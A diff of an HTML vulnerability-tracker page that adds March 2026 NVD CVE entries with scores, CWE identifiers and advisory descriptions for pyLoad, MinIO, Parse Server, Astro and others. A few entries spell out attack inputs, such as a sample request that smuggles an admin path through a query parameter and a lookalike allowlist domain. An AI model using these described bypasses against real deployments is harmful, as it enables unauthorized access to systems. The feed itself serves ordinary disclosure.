@@ -11,11 +11,11 @@
     <header>
       <h1>vuln-tracker</h1>
       <p class="subtitle">CVEs from the National Vulnerability Database — current and previous month</p>
-      <p class="last-updated">Last updated: 2026-03-24 19:13 UTC</p>
+      <p class="last-updated">Last updated: 2026-03-24 20:50 UTC</p>
     </header>
     <main>
     <section>
-      <h2>Current Month — March 2026 <span class="count">(4205)</span></h2>
+      <h2>Current Month — March 2026 <span class="count">(4247)</span></h2>
       <div class="table-wrapper">
         <table>
           <thead>
@@ -30,6 +30,392 @@
             </tr>
           </thead>
           <tbody>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33511" target="_blank" rel="noopener">CVE-2026-33511</a></td>
+        <td>8.8</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-639</td>
+        <td>&nbsp;</td>
+        <td><details><summary>pyLoad is a free and open-source download manager written in Python. From versio...</summary><p>pyLoad is a free and open-source download manager written in Python. From version 0.4.20 to before version 0.5.0b3.dev97, the local_check decorator in pyLoad&#x27;s ClickNLoad feature can be bypassed by any remote attacker through HTTP Host header spoofing. This allows unauthenticated remote users to access localhost-restricted endpoints, enabling them to inject arbitrary downloads, write files to the storage directory, and execute JavaScript code. This issue has been patched in version 0.5.0b3.dev97.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33509" target="_blank" rel="noopener">CVE-2026-33509</a></td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-269</td>
+        <td>&nbsp;</td>
+        <td><details><summary>pyLoad is a free and open-source download manager written in Python. From versio...</summary><p>pyLoad is a free and open-source download manager written in Python. From version 0.4.0 to before version 0.5.0b3.dev97, the set_config_value() API endpoint allows users with the non-admin SETTINGS permission to modify any configuration option without restriction. The reconnect.script config option controls a file path that is passed directly to subprocess.run() in the thread manager&#x27;s reconnect logic. A SETTINGS user can set this to any executable file on the system, achieving Remote Code Execution. The only validation in set_config_value() is a hardcoded check for general.storage_folder — all other security-critical settings including reconnect.script are writable without any allowlist or path restriction. This issue has been patched in version 0.5.0b3.dev97.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33419" target="_blank" rel="noopener">CVE-2026-33419</a></td>
+        <td>9.1</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>CWE-204</td>
+        <td>&nbsp;</td>
+        <td><details><summary>MinIO is a high-performance object storage system. Prior to RELEASE.2026-03-17T2...</summary><p>MinIO is a high-performance object storage system. Prior to RELEASE.2026-03-17T21-25-16Z, MinIO AIStor&#x27;s STS (Security Token Service) AssumeRoleWithLDAPIdentity endpoint is vulnerable to LDAP credential brute-forcing due to two combined weaknesses: (1) distinguishable error responses that enable username enumeration, and (2) absence of rate limiting on authentication attempts. An unauthenticated network attacker can enumerate valid LDAP usernames and then perform unlimited password guessing to obtain temporary AWS-style STS credentials, gaining access to the victim&#x27;s S3 buckets and objects. This issue has been patched in RELEASE.2026-03-17T21-25-16Z.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33412" target="_blank" rel="noopener">CVE-2026-33412</a></td>
+        <td>5.6</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-78</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Vim is an open source, command line text editor. Prior to version 9.2.0202, a co...</summary><p>Vim is an open source, command line text editor. Prior to version 9.2.0202, a command injection vulnerability exists in Vim&#x27;s glob() function on Unix-like systems. By including a newline character (\n) in a pattern passed to glob(), an attacker may be able to execute arbitrary shell commands. This vulnerability depends on the user&#x27;s &#x27;shell&#x27; setting. This issue has been patched in version 9.2.0202.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33353" target="_blank" rel="noopener">CVE-2026-33353</a></td>
+        <td>7.1</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-200</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Soft Serve is a self-hostable Git server for the command line. From version 0.6....</summary><p>Soft Serve is a self-hostable Git server for the command line. From version 0.6.0 to before version 0.11.6, an authorization flaw in repo import allows any authenticated SSH user to clone a server-local Git repository, including another user&#x27;s private repo, into a new repository they control. This issue has been patched in version 0.11.6.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33349" target="_blank" rel="noopener">CVE-2026-33349</a></td>
+        <td>5.9</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-1284</td>
+        <td>&nbsp;</td>
+        <td><details><summary>fast-xml-parser allows users to process XML from JS object without C/C++ based l...</summary><p>fast-xml-parser allows users to process XML from JS object without C/C++ based libraries or callbacks. From version 4.0.0-beta.3 to before version 5.5.7, the DocTypeReader in fast-xml-parser uses JavaScript truthy checks to evaluate maxEntityCount and maxEntitySize configuration limits. When a developer explicitly sets either limit to 0 — intending to disallow all entities or restrict entity size to zero bytes — the falsy nature of 0 in JavaScript causes the guard conditions to short-circuit, completely bypassing the limits. An attacker who can supply XML input to such an application can trigger unbounded entity expansion, leading to memory exhaustion and denial of service. This issue has been patched in version 5.5.7.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33347" target="_blank" rel="noopener">CVE-2026-33347</a></td>
+        <td>6.3</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-79</td>
+        <td>&nbsp;</td>
+        <td><details><summary>league/commonmark is a PHP Markdown parser. From version 2.3.0 to before version...</summary><p>league/commonmark is a PHP Markdown parser. From version 2.3.0 to before version 2.8.2, the DomainFilteringAdapter in the Embed extension is vulnerable to an allowlist bypass due to a missing hostname boundary assertion in the domain-matching regex. An attacker-controlled domain like youtube.com.evil passes the allowlist check when youtube.com is an allowed domain. This issue has been patched in version 2.8.2.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33345" target="_blank" rel="noopener">CVE-2026-33345</a></td>
+        <td>6.5</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-639</td>
+        <td>&nbsp;</td>
+        <td><details><summary>solidtime is an open-source time-tracking app. Prior to version 0.11.6, the proj...</summary><p>solidtime is an open-source time-tracking app. Prior to version 0.11.6, the project detail endpoint GET /api/v1/organizations/{org}/projects/{project} allows any authenticated Employee to access any project in the organization by UUID, including private projects they are not a member of. The index() endpoint correctly applies the visibleByEmployee() scope, but show() does not. This issue has been patched in version 0.11.6.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33344" target="_blank" rel="noopener">CVE-2026-33344</a></td>
+        <td>8.1</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-22</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Dagu is a workflow engine with a built-in Web user interface. From version 2.0.0...</summary><p>Dagu is a workflow engine with a built-in Web user interface. From version 2.0.0 to before version 2.3.1, the fix for CVE-2026-27598 added ValidateDAGName to CreateNewDAG and rewrote generateFilePath to use filepath.Base. This patched the CREATE path. The remaining API endpoints - GET, DELETE, RENAME, EXECUTE - all pass the {fileName} URL path parameter to locateDAG without calling ValidateDAGName. %2F-encoded forward slashes in the {fileName} segment traverse outside the DAGs directory. This issue has been patched in version 2.3.1.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33332" target="_blank" rel="noopener">CVE-2026-33332</a></td>
+        <td>6.9</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-20</td>
+        <td>&nbsp;</td>
+        <td><details><summary>NiceGUI is a Python-based UI framework. Prior to version 3.9.0, NiceGUI&#x27;s app.ad...</summary><p>NiceGUI is a Python-based UI framework. Prior to version 3.9.0, NiceGUI&#x27;s app.add_media_file() and app.add_media_files() media routes accept a user-controlled query parameter that influences how files are read during streaming. The parameter is passed to the range-response implementation without validation, allowing an attacker to bypass chunked streaming and force the server to load entire files into memory at once. With large media files and concurrent requests, this can lead to excessive memory consumption, degraded performance, or denial of service. This issue has been patched in version 3.9.0.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33331" target="_blank" rel="noopener">CVE-2026-33331</a></td>
+        <td>8.2</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-79</td>
+        <td>&nbsp;</td>
+        <td><details><summary>oRPC is an tool that helps build APIs that are end-to-end type-safe and adhere t...</summary><p>oRPC is an tool that helps build APIs that are end-to-end type-safe and adhere to OpenAPI standards. Prior to version 1.13.9, a stored cross-site scripting (XSS) vulnerability exists in the OpenAPI documentation generation of orpc. If an attacker can control any field within the OpenAPI specification (such as info.description), they can break out of the JSON context and execute arbitrary JavaScript when a user views the generated API documentation. This issue has been patched in version 1.13.9.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33330" target="_blank" rel="noopener">CVE-2026-33330</a></td>
+        <td>7.1</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-863</td>
+        <td>&nbsp;</td>
+        <td><details><summary>FileRise is a self-hosted web file manager / WebDAV server. Prior to version 3.1...</summary><p>FileRise is a self-hosted web file manager / WebDAV server. Prior to version 3.10.0, a broken access control issue in FileRise&#x27;s ONLYOFFICE integration allows an authenticated user with read-only access to obtain a signed save callbackUrl for a file and then directly forge the ONLYOFFICE save callback to overwrite that file with attacker-controlled content. This issue has been patched in version 3.10.0.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33329" target="_blank" rel="noopener">CVE-2026-33329</a></td>
+        <td>8.1</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-22</td>
+        <td>&nbsp;</td>
+        <td><details><summary>FileRise is a self-hosted web file manager / WebDAV server. From version 1.0.1 t...</summary><p>FileRise is a self-hosted web file manager / WebDAV server. From version 1.0.1 to before version 3.10.0, the resumableIdentifier parameter in the Resumable.js chunked upload handler (UploadModel::handleUpload()) is concatenated directly into filesystem paths without any sanitization. An authenticated user with upload permission can exploit this to write files to arbitrary directories on the server, delete arbitrary directories via the post-assembly cleanup, and probe file/directory existence. This issue has been patched in version 3.10.0.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33326" target="_blank" rel="noopener">CVE-2026-33326</a></td>
+        <td>4.3</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-863</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Keystone is a content management system for Node.js. Prior to version 6.5.2, {fi...</summary><p>Keystone is a content management system for Node.js. Prior to version 6.5.2, {field}.isFilterable access control can be bypassed in findMany queries by passing a cursor. This can be used to confirm the existence of records by protected field values. The fix for CVE-2025-46720 (field-level isFilterable bypass for update and delete mutations) added checks to the where parameter in update and delete mutations however the cursor parameter in findMany was not patched and accepts the same UniqueWhere input type. This issue has been patched in version 6.5.2.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33322" target="_blank" rel="noopener">CVE-2026-33322</a></td>
+        <td>9.2</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>CWE-287</td>
+        <td>&nbsp;</td>
+        <td><details><summary>MinIO is a high-performance object storage system. From RELEASE.2022-11-08T05-27...</summary><p>MinIO is a high-performance object storage system. From RELEASE.2022-11-08T05-27-07Z to before RELEASE.2026-03-17T21-25-16Z, a JWT algorithm confusion vulnerability in MinIO&#x27;s OpenID Connect authentication allows an attacker who knows the OIDC ClientSecret to forge arbitrary identity tokens and obtain S3 credentials with any policy, including consoleAdmin. This issue has been patched in RELEASE.2026-03-17T21-25-16Z.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33314" target="_blank" rel="noopener">CVE-2026-33314</a></td>
+        <td>6.5</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-287</td>
+        <td>&nbsp;</td>
+        <td><details><summary>pyLoad is a free and open-source download manager written in Python. Prior to ve...</summary><p>pyLoad is a free and open-source download manager written in Python. Prior to version 0.5.0b3.dev97, a Host Header Spoofing vulnerability in the @local_check decorator allows unauthenticated external attackers to bypass local-only restrictions. This grants access to the Click&#x27;N&#x27;Load API endpoints, enabling attackers to remotely queue arbitrary downloads, leading to Server-Side Request Forgery (SSRF) and Denial of Service (DoS). This issue has been patched in version 0.5.0b3.dev97.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32948" target="_blank" rel="noopener">CVE-2026-32948</a></td>
+        <td>6.7</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-78</td>
+        <td>&nbsp;</td>
+        <td><details><summary>sbt is a build tool for Scala, Java, and others. From version 0.9.5 to before ve...</summary><p>sbt is a build tool for Scala, Java, and others. From version 0.9.5 to before version 1.12.7, on Windows, sbt uses Process(&quot;cmd&quot;, &quot;/c&quot;, ...) to run VCS commands (git, hg, svn). The URI fragment (branch, tag, revision) is user-controlled via the build definition and passed to these commands without validation. Because cmd /c interprets &amp;, |, and ; as command separators, a malicious fragment can execute arbitrary commands. This issue has been patched in version 1.12.7.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22559" target="_blank" rel="noopener">CVE-2026-22559</a></td>
+        <td>8.8</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>N/A</td>
+        <td>&nbsp;</td>
+        <td><details><summary>An Improper Input Validation vulnerability in UniFi Network Server may allow una...</summary><p>An Improper Input Validation vulnerability in UniFi Network Server may allow unauthorized access to an account if the account owner is socially engineered into clicking a malicious link.
+
+
+Affected Products:
+UniFi Network Server (Version 10.1.85 and earlier) 
+
+
+Mitigation:
+Update UniFi Network Server to Version 10.1.89 or later.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-21783" target="_blank" rel="noopener">CVE-2026-21783</a></td>
+        <td>4.3</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-209</td>
+        <td>&nbsp;</td>
+        <td><details><summary>HCL Traveler is affected by sensitive information disclosure.  The application g...</summary><p>HCL Traveler is affected by sensitive information disclosure.  The application generates some error messages that provide detailed information about errors and failures, such as internal paths, file names, sensitive tokens, credentials, error codes, or stack traces.  Attackers could exploit this information to gain insights into the system&#x27;s architecture and potentially launch targeted attacks.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33769" target="_blank" rel="noopener">CVE-2026-33769</a></td>
+        <td>2.9</td>
+        <td><span class="severity low">LOW</span></td>
+        <td>CWE-20</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Astro is a web framework. From version 2.10.10 to before version 5.18.1, this is...</summary><p>Astro is a web framework. From version 2.10.10 to before version 5.18.1, this issue concerns Astro&#x27;s remotePatterns path enforcement for remote URLs used by server-side fetchers such as the image optimization endpoint. The path matching logic for /* wildcards is unanchored, so a pathname that contains the allowed prefix later in the path can still match. As a result, an attacker can fetch paths outside the intended allowlisted prefix on an otherwise allowed host. This issue has been patched in version 5.18.1.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33768" target="_blank" rel="noopener">CVE-2026-33768</a></td>
+        <td>6.5</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-441</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Astro is a web framework. Prior to version 10.0.2, the @astrojs/vercel serverles...</summary><p>Astro is a web framework. Prior to version 10.0.2, the @astrojs/vercel serverless entrypoint reads the x-astro-path header and x_astro_path query parameter to rewrite the internal request path, with no authentication whatsoever. On deployments without Edge Middleware, this lets anyone bypass Vercel&#x27;s platform-level path restrictions entirely. The override preserves the original HTTP method and body, so this isn&#x27;t limited to GET. POST, PUT, DELETE all land on the rewritten path. A Firewall rule blocking /admin/* does nothing when the request comes in as POST /api/health?x_astro_path=/admin/delete-user. This issue has been patched in version 10.0.2.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33627" target="_blank" rel="noopener">CVE-2026-33627</a></td>
+        <td>7.1</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-200</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Parse Server is an open source backend that can be deployed to any infrastructur...</summary><p>Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.61 and 9.6.0-alpha.55, an authenticated user calling GET /users/me receives unsanitized auth data, including sensitive credentials such as MFA TOTP secrets and recovery codes. The endpoint internally uses master-level authentication for the session query, and the master context leaks through to the user data, bypassing auth adapter sanitization. An attacker who obtains a user&#x27;s session token can extract MFA secrets to generate valid TOTP codes indefinitely. This issue has been patched in versions 8.6.61 and 9.6.0-alpha.55.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33624" target="_blank" rel="noopener">CVE-2026-33624</a></td>
+        <td>2.1</td>
+        <td><span class="severity low">LOW</span></td>
+        <td>CWE-367</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Parse Server is an open source backend that can be deployed to any infrastructur...</summary><p>Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.60 and 9.6.0-alpha.54, an attacker who obtains a user&#x27;s password and a single MFA recovery code can reuse that recovery code an unlimited number of times by sending concurrent login requests. This defeats the single-use design of recovery codes. The attack requires the user&#x27;s password, a valid recovery code, and the ability to send concurrent requests within milliseconds. This issue has been patched in versions 8.6.60 and 9.6.0-alpha.54.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33539" target="_blank" rel="noopener">CVE-2026-33539</a></td>
+        <td>8.6</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-89</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Parse Server is an open source backend that can be deployed to any infrastructur...</summary><p>Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.59 and 9.6.0-alpha.53, an attacker with master key access can execute arbitrary SQL statements on the PostgreSQL database by injecting SQL metacharacters into field name parameters of the aggregate $group pipeline stage or the distinct operation. This allows privilege escalation from Parse Server application-level administrator to PostgreSQL database-level access. Only Parse Server deployments using PostgreSQL are affected. MongoDB deployments are not affected. This issue has been patched in versions 8.6.59 and 9.6.0-alpha.53.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33538" target="_blank" rel="noopener">CVE-2026-33538</a></td>
+        <td>8.7</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-400</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Parse Server is an open source backend that can be deployed to any infrastructur...</summary><p>Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.58 and 9.6.0-alpha.52, an unauthenticated attacker can cause denial of service by sending authentication requests with arbitrary, unconfigured provider names. The server executes a database query for each unconfigured provider before rejecting the request, and since no database index exists for unconfigured providers, each request triggers a full collection scan on the user database. This can be parallelized to saturate database resources. This issue has been patched in versions 8.6.58 and 9.6.0-alpha.52.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33527" target="_blank" rel="noopener">CVE-2026-33527</a></td>
+        <td>5.3</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-863</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Parse Server is an open source backend that can be deployed to any infrastructur...</summary><p>Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.57 and 9.6.0-alpha.48, an authenticated user can overwrite server-generated session fields such as expiresAt and createdWith when updating their own session via the REST API. This allows bypassing the server&#x27;s configured session lifetime policy, making a session effectively permanent. This issue has been patched in versions 8.6.57 and 9.6.0-alpha.48.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33508" target="_blank" rel="noopener">CVE-2026-33508</a></td>
+        <td>8.2</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-674</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Parse Server is an open source backend that can be deployed to any infrastructur...</summary><p>Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.56 and 9.6.0-alpha.45, Parse Server&#x27;s LiveQuery component does not enforce the requestComplexity.queryDepth configuration setting when processing WebSocket subscription requests. An attacker can send a subscription with deeply nested logical operators, causing excessive recursion and CPU consumption that degrades or disrupts service availability. This issue has been patched in versions 8.6.56 and 9.6.0-alpha.45.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33498" target="_blank" rel="noopener">CVE-2026-33498</a></td>
+        <td>8.7</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-674</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Parse Server is an open source backend that can be deployed to any infrastructur...</summary><p>Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.55 and 9.6.0-alpha.44, an attacker can send an unauthenticated HTTP request with a deeply nested query containing logical operators to permanently hang the Parse Server process. The server becomes completely unresponsive and must be manually restarted. This is a bypass of the fix for CVE-2026-32944. This issue has been patched in versions 8.6.55 and 9.6.0-alpha.44.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33429" target="_blank" rel="noopener">CVE-2026-33429</a></td>
+        <td>6.3</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-203</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Parse Server is an open source backend that can be deployed to any infrastructur...</summary><p>Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.54 and 9.6.0-alpha.43, an attacker can subscribe to LiveQuery with a watch parameter targeting a protected field. Although the protected field value is properly stripped from event payloads, the presence or absence of update events reveals whether the protected field changed, creating a binary oracle. For boolean protected fields, the timing of change events is equivalent to knowing the field value. This issue has been patched in versions 8.6.54 and 9.6.0-alpha.43.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33421" target="_blank" rel="noopener">CVE-2026-33421</a></td>
+        <td>7.1</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-863</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Parse Server is an open source backend that can be deployed to any infrastructur...</summary><p>Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.53 and 9.6.0-alpha.42, Parse Server&#x27;s LiveQuery WebSocket interface does not enforce Class-Level Permission (CLP) pointer permissions (readUserFields and pointerFields). Any authenticated user can subscribe to LiveQuery events and receive real-time updates for all objects in classes protected by pointer permissions, regardless of whether the pointer fields on those objects point to the subscribing user. This bypasses the intended read access control, allowing unauthorized access to potentially sensitive data that is correctly restricted via the REST API. This issue has been patched in versions 8.6.53 and 9.6.0-alpha.42.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33417" target="_blank" rel="noopener">CVE-2026-33417</a></td>
+        <td>6.5</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-613</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Wallos is an open-source, self-hostable personal subscription tracker. Prior to ...</summary><p>Wallos is an open-source, self-hostable personal subscription tracker. Prior to version 4.7.2, password reset tokens in Wallos never expire. The password_resets table includes a created_at timestamp column, but the token validation logic never checks it. A password reset token remains valid indefinitely until it is used, allowing an attacker who intercepts a reset link at any point to use it days, weeks, or months later. This issue has been patched in version 4.7.2.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33409" target="_blank" rel="noopener">CVE-2026-33409</a></td>
+        <td>7.0</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-287</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Parse Server is an open source backend that can be deployed to any infrastructur...</summary><p>Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.52 and 9.6.0-alpha.41, an authentication bypass vulnerability allows an attacker to log in as any user who has linked a third-party authentication provider, without knowing the user&#x27;s credentials. The attacker only needs to know the user&#x27;s provider ID to gain full access to their account, including a valid session token. This affects Parse Server deployments where the server option allowExpiredAuthDataToken is set to true. The default value is false. This issue has been patched in versions 8.6.52 and 9.6.0-alpha.41.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33323" target="_blank" rel="noopener">CVE-2026-33323</a></td>
+        <td>6.3</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-204</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Parse Server is an open source backend that can be deployed to any infrastructur...</summary><p>Parse Server is an open source backend that can be deployed to any infrastructure that can run Node.js. Prior to versions 8.6.51 and 9.6.0-alpha.40, the Pages route and legacy PublicAPI route for resending email verification links return distinguishable responses depending on whether the provided username exists and has an unverified email. This allows an unauthenticated attacker to enumerate valid usernames by observing different redirect targets. The existing emailVerifySuccessOnInvalidEmail configuration option, which is enabled by default and protects the API route against this, did not apply to these routes. This issue has been patched in versions 8.6.51 and 9.6.0-alpha.40.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30932" target="_blank" rel="noopener">CVE-2026-30932</a></td>
+        <td>8.6</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-74</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Froxlor is open source server administration software. Prior to version 2.3.5, t...</summary><p>Froxlor is open source server administration software. Prior to version 2.3.5, the DomainZones.add API endpoint (accessible to customers with DNS enabled) does not validate the content field for several DNS record types (LOC, RP, SSHFP, TLSA). An attacker can inject newlines and BIND zone file directives (e.g. $INCLUDE) into the zone file that gets written to disk when the DNS rebuild cron job runs. This issue has been patched in version 2.3.5.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2417" target="_blank" rel="noopener">CVE-2026-2417</a></td>
+        <td>9.3</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>CWE-306</td>
+        <td>&nbsp;</td>
+        <td><details><summary>A Missing Authentication for Critical Function vulnerability in Pharos Controls ...</summary><p>A Missing Authentication for Critical Function vulnerability in Pharos Controls Mosaic Show Controller firmware version 2.15.3 could allow an unauthenticated attacker to bypass authentication and execute arbitrary commands with root privileges.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29772" target="_blank" rel="noopener">CVE-2026-29772</a></td>
+        <td>5.9</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-770</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Astro is a web framework. Prior to version 10.0.0, Astro&#x27;s Server Islands POST h...</summary><p>Astro is a web framework. Prior to version 10.0.0, Astro&#x27;s Server Islands POST handler buffers and parses the full request body as JSON without enforcing a size limit. Because JSON.parse() allocates a V8 heap object for every element in the input, a crafted payload of many small JSON objects achieves ~15x memory amplification (wire bytes to heap bytes), allowing a single unauthenticated request to exhaust the process heap and crash the server. The /_server-islands/[name] route is registered on all Astro SSR apps regardless of whether any component uses server:defer, and the body is parsed before the island name is validated, so any Astro SSR app with the Node standalone adapter is affected. This issue has been patched in version 10.0.0.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-23924" target="_blank" rel="noopener">CVE-2026-23924</a></td>
+        <td>6.1</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-88</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Zabbix Agent 2 Docker plugin does not properly sanitize the &#x27;docker.container_in...</summary><p>Zabbix Agent 2 Docker plugin does not properly sanitize the &#x27;docker.container_info&#x27; parameters when forwarding them to the Docker daemon. An attacker capable of invoking Agent 2 can read arbitrary files from running Docker containers by injecting them via the Docker archive API.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
